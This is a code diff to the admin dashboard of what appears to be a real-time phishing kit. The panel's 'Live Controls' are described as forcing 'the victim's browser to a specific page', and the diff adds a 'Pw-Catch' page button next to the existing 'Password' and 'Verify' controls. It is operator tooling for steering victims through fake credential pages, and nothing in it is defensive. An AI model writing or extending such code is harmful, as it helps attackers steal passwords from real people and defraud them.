@@ -251,13 +251,20 @@ export function AdminDashboard() {
                     <div>
                         <h3 className="font-semibold mb-2">Live Controls</h3>
                         <CardDescription className="mb-4">Force the victim's browser to a specific page.</CardDescription>
-                        <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
+                        <div className="grid grid-cols-2 sm:grid-cols-5 gap-2">
                             <Button 
                               variant={state?.victim.currentPage === 'password' ? "default" : "outline"}
                               onClick={() => handleControlClick('password')}
                               className={cn(state?.victim.currentPage === 'password' && "animate-shine")}
                             >
                               Password
+                            </Button>
+                            <Button 
+                              variant={state?.victim.currentPage === 'pwCatch' ? "default" : "outline"}
+                              onClick={() => handleControlClick('pwCatch')}
+                              className={cn(state?.victim.currentPage === 'pwCatch' && "animate-shine")}
+                            >
+                              Pw-Catch
                             </Button>
                             <Button 
                               variant={state?.victim.currentPage === 'verify' ? "default" : "outline"}
